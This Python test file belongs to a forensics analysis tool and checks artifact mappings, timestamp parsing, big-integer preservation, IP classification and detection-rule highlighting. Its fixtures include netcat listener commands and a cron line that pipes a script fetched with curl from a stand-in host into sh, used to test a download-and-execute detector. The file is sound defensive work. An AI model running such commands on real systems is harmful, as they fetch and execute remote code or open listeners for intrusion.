"""Renderer registry, explicit timestamps, exact values, network classes and rule spans."""

import json

import pytest

from vr_dfir.analysis.networks import classify
from vr_dfir.analysis.signals import evaluate_row, rule_spans
from vr_dfir.errors import ConfigurationError
from vr_dfir.evidence import presentation as pres
from vr_dfir.evidence.exact import BIGINT_KEY, protect, raw_text
from vr_dfir.evidence.timeparse import parse_time


def test_mapping_comes_from_source_identity_not_column_names():
    assert pres.mapping_for("Linux.Sys.Pslist", None).id == "process"
    assert pres.mapping_for("LTH.SystemBaseline", "Processes").id == "process"
    assert pres.mapping_for("Linux.Sys.Crontab", "CronScripts").id == "file"
    # A custom source with process-like column names stays generic.
    generic = pres.mapping_for("Custom.Example", "Inventory")
    assert generic.id == "generic"
    row = {"Exe": "/tmp/x", "CommandLine": "nc -l 4444"}
    assert pres.entities(generic, row, pres.resolve_fields(generic, row=row)) == []
    assert pres.column_plan(generic, {}, ["A", "B", "C", "D", "E", "F", "G"])["default"][-1][
        "key"] == "F"


def test_configured_mapping(tmp_path):
    cfg = tmp_path / "mappings.json"
    cfg.write_text(json.dumps({"mappings": [{"artifact": "Custom.Example", "source": "Inventory",
                                             "domain": "file", "roles": {"owner": "Owner"},
                                             "event_time": {"field": "Seen",
                                                            "format": "epoch_s"}}]}))
    configured = pres.load_configured(str(cfg))
    m = pres.mapping_for("Custom.Example", "Inventory", configured)
    assert m.id == "file" and m.configured
    row = {"Path": "/opt/x", "Owner": "root", "Seen": 1767225600}
    fields = pres.resolve_fields(m, row=row)
    parsed, basis = pres.event_time(m, row, fields)
    assert parsed.ok and basis["format"] == "epoch_s"
    cfg.write_text(json.dumps({"mappings": [{"artifact": "X", "domain": "nope"}]}))
    with pytest.raises(ConfigurationError):
        pres.load_configured(str(cfg))


@pytest.mark.parametrize("value,fmt,status", [
    ("2026-01-01T00:00:00Z", "iso8601", "ok"),
    ("2026-01-01T03:30:00+03:30", "iso8601", "ok"),
    ("2026-01-01 00:00:00", "iso8601", "naive"),
    ("2026-01-01T00:00:00+15:00", "iso8601", "out_of_range"),
    ("not a time", "iso8601", "invalid"),
    (1767225600, "iso8601", "invalid"),
    (1767225600, "epoch_s", "ok"),
    (1767225600, "epoch_ms", "out_of_range"),  # never re-interpreted by magnitude
    (True, "epoch_s", "invalid"),
    ("", "iso8601", "missing"),
    (None, "epoch_s", "missing"),
])
def test_time_parsing_is_explicit(value, fmt, status):
    assert parse_time(value, fmt).status == status


def test_offsets_convert_to_the_same_instant():
    a = parse_time("2026-01-01T03:30:00+03:30", "iso8601").micros
    b = parse_time("2026-01-01T00:00:00Z", "iso8601").micros
    assert a == b


def test_process_event_time_and_untimed_sources():
    m = pres.mapping_for("LTH.SystemBaseline", "Processes")
    row = {"Name": "x", "StartTime": "2026-01-01T00:01:00Z"}
    parsed, basis = pres.event_time(m, row, pres.resolve_fields(m, row=row))
    assert parsed.ok and basis["field"] == "StartTime"
    net = pres.mapping_for("LTH.SystemBaseline", "NetworkConnections")
    row = {"Timestamp": "2026-01-01T00:01:00Z"}
    assert pres.event_time(net, row, pres.resolve_fields(net, row=row))[0].status == "unmapped"


def test_entities_and_titles():
    net = pres.mapping_for("Linux.Network.Netstat", None)
    listen = {"Type": "TCP", "State": "Listening", "LocalAddr": "0.0.0.0", "LocalPort": 22,
              "RemoteAddr": "0.0.0.0", "RemotePort": 0}
    est = {"Type": "TCP", "State": "Established", "LocalAddr": "10.0.0.5", "LocalPort": 4000,
           "RemoteAddr": "2001:db8::1", "RemotePort": 443}
    assert pres.entities(net, listen, pres.resolve_fields(net, row=listen)) == []
    ents = pres.entities(net, est, pres.resolve_fields(net, row=est))
    assert ents == [("network_destination", "[2001:db8::1]:443", "[2001:db8::1]:443")]
    assert "→ 2001:db8::1" in pres.title(net, est, pres.resolve_fields(net, row=est)) or \
        "→ [2001:db8::1]:443" in pres.title(net, est, pres.resolve_fields(net, row=est))
    users = pres.mapping_for("Linux.Sys.Users", None)
    row = {"User": "ops", "Uid": "0"}
    assert ("privileged_account", "ops", "ops") in pres.entities(
        users, row, pres.resolve_fields(users, row=row))
    proc = pres.mapping_for("Linux.Sys.Pslist", None)
    row = {"Exe": "/tmp/x (deleted)", "Hash": {"SHA256": "not-hex"}, "CommandLine": "a   b"}
    kinds = {k: v for k, v, _ in pres.entities(proc, row, pres.resolve_fields(proc, row=row))}
    assert kinds == {"executable_path": "/tmp/x", "command": "a b"}


def test_nested_address_fields_prefer_the_nested_value():
    net = pres.mapping_for("Windows.Network.Netstat", None)
    row = {"Laddr": {"IP": "10.0.0.1", "Port": 135}, "Status": "LISTEN", "Type": "TCP"}
    fields = pres.resolve_fields(net, row=row)
    assert fields["laddr"] == "Laddr.IP" and fields["lport"] == "Laddr.Port"


def test_exact_values_survive_transport():
    row = {"b": 1, "a": 2**63 - 1, "nested": [{"x": -(2**60)}], "s": "٣ مدیر"}
    wrapped = protect(row)
    assert wrapped["a"] == {BIGINT_KEY: str(2**63 - 1)} and wrapped["b"] == 1
    assert wrapped["nested"][0]["x"] == {BIGINT_KEY: str(-(2**60))}
    text = raw_text(row)
    assert list(json.loads(text)) == ["b", "a", "nested", "s"]
    assert str(2**63 - 1) in text and "مدیر" in text


def test_network_classes_are_documented_ranges_only():
    assert classify("203.0.113.50")["class"] == "documentation"
    assert classify("10.1.2.3")["class"] == "private"
    assert classify("8.8.8.8")["class"] == "public"
    assert classify("::ffff:192.168.1.1")["class"] == "private"
    assert classify("100.64.1.1", "100.64.0.0/10")["class"] == "configured_internal"
    assert classify("not-an-ip") is None
    labels = {classify(a)["label"] for a in ("8.8.8.8", "203.0.113.1", "127.0.0.1")}
    assert not any("malicious" in x.lower() for x in labels)


def test_rule_spans_only_for_requested_rules_with_utf16_offsets():
    row = {"Exe": "/tmp/.cache/kworkerd", "CommandLine": "💥 ncat -l", "Name": "kworkerd",
           "IsDeleted": True}
    rules = evaluate_row(row).rule_ids
    assert "suspicious_token" in rules
    spans = rule_spans(row, ["suspicious_token"])
    assert spans == [{"rule_id": "suspicious_token", "field": "CommandLine", "start": 3, "end": 7}]
    assert rule_spans(row, []) == []
    # A rule that does not match this row produces no span even if requested.
    assert rule_spans(row, ["cron_download_exec"]) == []
    cron = {"Command": "curl -fsSL http://198.51.100.23/u.sh | sh"}
    got = rule_spans(cron, ["cron_download_exec"])
    assert [cron["Command"][s["start"]:s["end"]] for s in got] == ["curl", "| sh"]
